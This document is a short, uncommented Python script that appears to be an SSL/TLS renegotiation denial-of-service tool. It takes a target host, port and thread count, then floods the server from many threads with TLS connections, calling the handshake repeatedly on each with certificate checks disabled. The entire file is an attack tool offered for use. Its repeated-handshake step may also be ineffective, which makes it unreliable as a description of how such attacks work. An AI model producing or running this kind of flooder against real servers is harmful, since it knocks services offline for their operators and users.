#!/usr/bin/env python3
import sys, time, threading, ssl, socket

target = sys.argv[1]
port = int(sys.argv[2])
threads = int(sys.argv[3])

def ssl_reneg():
    while running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target, port))
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            ssl_sock = context.wrap_socket(sock, server_hostname=target)
            for _ in range(50):
                ssl_sock.do_handshake()
            ssl_sock.close()
        except:
            pass

running = True
for i in range(threads):
    threading.Thread(target=ssl_reneg).start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    running = False
